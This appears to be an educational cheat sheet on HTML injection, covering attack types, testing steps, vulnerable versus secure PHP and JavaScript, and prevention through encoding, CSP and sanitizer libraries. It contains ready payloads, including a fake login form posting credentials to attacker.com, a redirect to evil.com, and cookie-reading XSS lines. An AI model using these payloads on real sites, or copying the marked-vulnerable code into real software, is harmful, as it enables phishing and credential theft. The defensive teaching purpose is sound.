# HTML Injection 

## Definition

HTML Injection is a web vulnerability where attackers inject malicious HTML code into web pages. This happens when user input is displayed on a page without proper sanitization or encoding, allowing the browser to interpret injected HTML as legitimate code.

## Types of HTML Injection

### 1. Reflected HTML Injection
- **Nature**: Temporary, non-persistent
- **How**: Malicious HTML reflected immediately from URL/form
- **Impact**: Affects only users who click malicious link
- **Example**: 

```
https://site.com/search?q=<h1>Hacked</h1>
```

The search query gets reflected on the page without encoding

### 2. Stored HTML Injection
- **Nature**: Permanent, persistent in database
- **How**: Malicious HTML saved on server
- **Impact**: Affects ALL users viewing that content
- **Example**: Comment system storing `<iframe src="evil.com"></iframe>`
- **More Dangerous**: Because it's permanent and affects multiple users

## How Attack Works

1. **Discovery**: Attacker finds input field (search, comment, profile)
2. **Testing**: Tries basic HTML like `<b>test</b>`
3. **Exploitation**: If HTML renders, injects malicious code
4. **Impact**: Users see defaced content, fake forms, or worse

### Attack Flow Example:

```
User Input: <h1>FREE MONEY</h1><form action="http://steal.com">...
     ↓
Server: Stores/reflects without encoding
     ↓
HTML Output: <div>Comment: <h1>FREE MONEY</h1><form>...</div>
     ↓
Browser: Renders the injected HTML as real content
```

## Vulnerable vs Secure Code

### PHP Examples
```php
// ❌ VULNERABLE - Direct output
echo "Hello " . $_GET['name'];
echo "<div>$userComment</div>";

// ✅ SECURE - With encoding
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "<div>" . htmlspecialchars($userComment, ENT_QUOTES, 'UTF-8') . "</div>";
```

### JavaScript Examples
```javascript
// ❌ VULNERABLE - Using innerHTML
document.getElementById('output').innerHTML = userInput;
document.write("<h1>" + userName + "</h1>");

// ✅ SECURE - Using textContent
document.getElementById('output').textContent = userInput;
// Or sanitize if HTML needed
document.getElementById('output').innerHTML = DOMPurify.sanitize(userInput);
```

## Common Attack Payloads

### Basic UI Manipulation

```html
<h1>This Site is Hacked</h1>
<marquee>Your computer has virus!</marquee>
<style>body{display:none}</style>
```

### Phishing Attacks
```html
<!-- Fake login form -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999">
  <h2>Session Expired - Please Login</h2>
  <form action="https://attacker.com/steal.php">
    <input name="user" placeholder="Username">
    <input name="pass" type="password" placeholder="Password">
    <input type="submit" value="Login">
  </form>
</div>
```

### Content Injection
```html
<!-- Iframe to malicious site -->
<iframe src="https://malicious-site.com" style="width:100%;height:500px"></iframe>

<!-- Auto-redirect -->
<meta http-equiv="refresh" content="0;url=https://evil.com">

<!-- Fake alerts -->
<h1 style="color:red">⚠️ YOUR ACCOUNT WILL BE DELETED IN 24 HOURS!</h1>
```

### XSS Escalation
```html
<!-- If these work, it's also XSS -->
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

## Testing for HTML Injection

### Manual Testing Steps
1. **Find Input Points**: Forms, URL params, headers
2. **Test Basic HTML**: 
   ```html
   <b>bold</b>
   <i>italic</i>
   <u>underline</u>
   ```
3. **Check Output**: 
   - If text appears **bold/italic** → Vulnerable
   - If you see `<b>bold</b>` as text → Safe
4. **Try Advanced Payloads**:
   ```html
   <h1>test</h1>
   <iframe src="about:blank"></iframe>
   <form><button>Click</button></form>
   ```

### Where to Test
- Search boxes: `search.php?q=<h1>test</h1>`
- User profiles: Name, Bio, Location fields
- Comments/Forums
- Contact forms
- Error pages: `page.php?error=<h1>Error</h1>`
- File upload names

## Prevention Techniques

### 1. Output Encoding (MOST IMPORTANT)

Convert special characters to HTML entities:
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`
- `'` becomes `&#x27;`

**PHP Implementation:**
```php
// Simple encoding
$safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// For URLs
$safe_url = urlencode($input);
```

### 2. Context-Aware Encoding
Different contexts need different encoding:
```php
// HTML context
<div><?= htmlspecialchars($data) ?></div>

// JavaScript context
<script>var user = <?= json_encode($data) ?>;</script>

// URL context
<a href="page.php?id=<?= urlencode($data) ?>">Link</a>

// CSS context (be very careful)
<style>.class { color: <?= preg_replace('/[^a-zA-Z0-9]/', '', $data) ?>; }</style>
```

### 3. Input Validation
```php
// Whitelist approach
if (!preg_match('/^[a-zA-Z0-9\s]{1,50}$/', $username)) {
    die("Invalid username");
}

// Length limits
if (strlen($comment) > 1000) {
    die("Comment too long");
}
```

### 4. Content Security Policy (CSP)
```python
# .htaccess or server config
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

### 5. Use Safe Libraries/Frameworks

**For Rich Content (when you need some HTML):**

```javascript
// JavaScript - DOMPurify
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
});
```

```php
// PHP - HTMLPurifier
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean = $purifier->purify($dirty);
```

## HTML Injection vs XSS

| Aspect | HTML Injection | XSS |
|--------|---------------|-----|
| **What's injected** | HTML tags (`<h1>`, `<form>`) | JavaScript code |
| **Execution** | No script execution | Executes JavaScript |
| **Example** | `<h1>Hacked</h1>` | `<script>alert(1)</script>` |
| **Main Goal** | Deface, phish | Steal cookies, hijack session |
| **Severity** | Medium-High | High-Critical |

**Important**: HTML injection can become XSS if JavaScript execution is possible!

---
## Real-World Scenarios

### Scenario 1: Forum Stored Injection
```
1. Attacker posts: <iframe src="http://fake-bank.com"></iframe>
2. Post saved to database
3. Every user viewing the thread sees fake bank site
4. Users might enter credentials thinking it's legitimate
```

### Scenario 2: Search Reflected Injection
```
1. Attacker crafts: site.com/search?q=<form action="http://steal.com">...
2. Sends link to victim
3. Victim clicks and sees fake form on trusted site
4. Victim submits credentials to attacker
```

## Security Headers
Add these headers for extra protection:
```apache
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
```

## Quick Testing Payloads
```html
<!-- Basic test -->
<h1>XSS</h1>

<!-- Style injection -->
<style>body{background:red}</style>

<!-- Form injection -->
<form><input value="Click me"></form>

<!-- Advanced -->
<svg><script>alert(1)</script></svg>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
```

## Key Points to Remember

1. **HTML Injection ≠ XSS** (but can lead to XSS)
2. **Stored is worse than Reflected** (affects more users)
3. **Always encode output**, not just filter input
4. **Different contexts need different encoding**
5. **Use htmlspecialchars() in PHP, textContent in JS**
6. **Modern frameworks often handle this automatically**
7. **Test both input and output points**
8. **Rich text editors need special handling**

## Common Mistakes Developers Make
- Only filtering input, not encoding output
- Using blacklists instead of whitelists
- Forgetting about different contexts (HTML vs JS vs URL)
- Trusting data from database (it might be poisoned)
- Using innerHTML when textContent would work
- Not testing with special characters

## If You Find HTML Injection
1. Check if JavaScript execution is possible (makes it XSS)
2. Test if it's stored or reflected
3. Identify all affected pages/parameters
4. Document with proof-of-concept
5. Report severity based on impact

---
---